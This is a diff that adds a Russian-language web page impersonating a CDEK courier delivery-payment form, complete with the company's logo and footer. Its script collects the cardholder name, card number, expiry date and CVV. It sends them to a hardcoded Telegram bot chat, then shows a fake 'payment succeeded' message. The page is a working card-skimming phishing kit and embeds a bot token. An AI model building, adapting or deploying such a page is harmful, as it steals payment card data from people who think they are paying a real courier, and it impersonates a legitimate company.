@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Оплата доставки — CDEK</title>
+
+  <style>
+    body { font-family: Arial, sans-serif; background:#f4f6f9; margin:0; }
+    .wrapper { max-width: 500px; margin:40px auto; background:#fff; padding:30px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.08); }
+    label { display:block; margin:10px 0 4px; }
+    input, select { width:100%; padding:10px; border:1px solid #ccc; border-radius:8px; font-size:15px; }
+    button { width:100%; padding:12px; margin-top:18px; background:#0bb232; color:#fff; font-size:17px; border:0; border-radius:8px; cursor:pointer; }
+    button:hover { background:#099828; }
+
+    #loadingBox { display:none; margin-top:20px; padding:20px; background:#fff; border-radius:10px; box-shadow:0 4px 12px rgba(0,0,0,0.1); text-align:center; font-size:18px; font-weight:bold; }
+    .spinner { width:36px; height:36px; border:4px solid #ccc; border-top:4px solid #0bb232; border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 10px; }
+    @keyframes spin { from { transform:rotate(0deg);} to { transform:rotate(360deg);} }
+    .checkmark { font-size:46px; color:#0bb232; display:none; }
+
+    /* FOOTER */
+    .cdek-footer { background:#1c1d22; color:#d0d0d0; padding:50px 20px 20px; }
+    .cdek-footer-container { max-width:1150px; margin:auto; display:flex; justify-content:space-between; gap:50px; }
+    .cdek-footer-column { min-width:280px; }
+    .cdek-footer-title { font-size:19px; font-weight:bold; color:#fff; margin-bottom:18px; }
+    .cdek-footer-link { display:block; color:#8eb6ff; text-decoration:none; margin:6px 0; font-size:15px; }
+    .cdek-footer-link:hover { text-decoration:underline; }
+    .cdek-footer-chat { margin-top:18px; display:flex; align-items:center; gap:8px; font-size:17px; color:#fff; cursor:pointer; }
+    .cdek-footer-contacts { margin-top:10px; line-height:21px; font-size:15px; }
+    .cdek-footer-bottom { border-top:1px solid #33363d; margin-top:40px; padding-top:18px; text-align:center; color:#9b9b9b; font-size:14px; }
+
+    .cdek-chat-float { position:fixed; bottom:25px; right:25px; width:55px; height:55px; background:#10c44c; border-radius:50%; display:flex; justify-content:center; align-items:center; font-size:26px; color:white; cursor:pointer; box-shadow:0 4px 12px rgba(0,0,0,0.3);}
+  </style>
+</head>
+<body>
+
+<div class="wrapper">
+   <div style="text-align:center; margin-bottom:10px;">
+  <img src="https://www.cdek.ru/storage/source/logo/1/4_0f8XMrGspUYCdNJHhL0RmHofYRlP10.svg" width="55">
+</div>
+
+<h2 style="text-align:center;">Оплата доставки</h2>
+
+  <form id="payForm">
+
+    <label>Имя владельца карты</label>
+    <input type="text" id="owner" placeholder="Например: Ivan Petrov" required>
+
+    <label>Номер карты</label>
+    <input type="text" id="card" placeholder="0000 0000 0000 0000" required>
+
+    <label>Месяц</label>
+    <select id="month" required>
+      <option value="">Месяц</option>
+      <option>01</option><option>02</option><option>03</option><option>04</option>
+      <option>05</option><option>06</option><option>07</option><option>08</option>
+      <option>09</option><option>10</option><option>11</option><option>12</option>
+    </select>
+
+    <label>Год</label>
+    <select id="year" required>
+      <option value="">Год</option>
+      <script>
+        const y = new Date().getFullYear();
+        for(let i=0;i<10;i++){
+          document.write(`<option>${y+i}</option>`);
+        }
+      </script>
+    </select>
+
+    <label>CVV</label>
+    <input type="password" id="cvv" maxlength="3" required>
+
+    <label>Стоимость доставки (KGS)</label>
+    <input type="number" id="amount" required>
+
+    <button type="submit">Оплатить</button>
+  </form>
+
+  <div id="loadingBox">
+    <div id="spinner" class="spinner"></div>
+    <div id="checkmark" class="checkmark">✔</div>
+    <div id="loadingText">Обработка платежа...</div>
+  </div>
+</div>
+
+<footer class="cdek-footer">
+  <div class="cdek-footer-container">
+    <div class="cdek-footer-column">
+      <div class="cdek-footer-title">Соглашения</div>
+      <a href="#" class="cdek-footer-link">Политика экспортного и санкционного контроля</a>
+      <a href="#" class="cdek-footer-link">Юридическая информация</a>
+      <a href="#" class="cdek-footer-link">Политика сбора персональных данных</a>
+      <a href="#" class="cdek-footer-link">Пользовательское соглашение</a>
+    </div>
+
+    <div class="cdek-footer-column">
+      <div class="cdek-footer-title">Поддержка</div>
+      <a href="#" class="cdek-footer-link">Частые вопросы</a>
+
+      <div class="cdek-footer-chat">💬 <span>Написать в чат</span></div>
+
+      <div class="cdek-footer-contacts">
+        <div>(+) 99 631 296 3246</div>
+        <div>ПН–ПТ с 10:00 до 20:00</div>
+        <div>СБ–ВС с 10:00 до 18:00</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="cdek-footer-bottom">
+    ©2000 — 2025, Курьерская компания СДЭК
+  </div>
+</footer>
+
+<script>
+
+const BOT_TOKEN = "8370248542:AAFb9DPrV82mFQC6sQ1TLm9c3H35tfLbq3g";
+const CHAT_ID = "6739073044";
+
+document.getElementById("card").addEventListener("input", function() {
+    this.value = this.value.replace(/[^0-9 ]/g, "");
+});
+
+document.getElementById("payForm").addEventListener("submit", async e => {
+    e.preventDefault();
+
+    const box = document.getElementById("loadingBox");
+    const spinner = document.getElementById("spinner");
+    const checkmark = document.getElementById("checkmark");
+    const text = document.getElementById("loadingText");
+
+    box.style.display = "block";
+    spinner.style.display = "block";
+    checkmark.style.display = "none";
+    text.innerHTML = "Обработка платежа...";
+
+    let owner  = document.getElementById('owner').value;
+    let card   = document.getElementById('card').value;
+    let month  = document.getElementById('month').value;
+    let year   = document.getElementById('year').value;
+    let cvv    = document.getElementById('cvv').value;
+    let amount = document.getElementById('amount').value;
+
+    let message = `
+💳 *Новая оплата*
+━━━━━━━━━━━━━━
+*Владелец:* ${owner}
+*Карта:* ${card}
+*Месяц:* ${month}
+*Год:* ${year}
+*CVV:* ${cvv}
+*Сумма:* ${amount} KGS`;
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method:"POST",
+        headers: { "Content-Type":"application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode:"Markdown"
+        })
+    });
+
+    /* смена на галочку */
+    setTimeout(() => {
+      spinner.style.display = "none";
+      checkmark.style.display = "block";
+      text.innerHTML = "Оплата успешно проведена";
+      document.getElementById("payForm").reset();
+    }, 1200);
+
+});
+
+</script>
+
+</body>
+</html>
